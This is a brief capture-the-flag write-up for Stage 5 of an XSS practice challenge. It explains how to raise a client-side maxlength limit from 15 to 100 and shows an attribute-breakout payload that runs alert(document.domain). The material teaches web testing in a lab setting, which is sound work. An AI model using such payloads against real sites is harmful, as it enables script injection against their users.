# **XSS Challenges Stage 5**

![](https://i.imgur.com/WxxrUlm.png)

First, we try to paste Stage 4's offset, then we found something wrong.
Lenghth is limited by `maxlength="15"`.

![](https://i.imgur.com/5jKrfQF.png)

Change it to `maxlength="100"` to bigger enough for our offset.

```
"><script>alert(document.domain);</script><a style="
```

![](https://i.imgur.com/lsU0CYF.png)








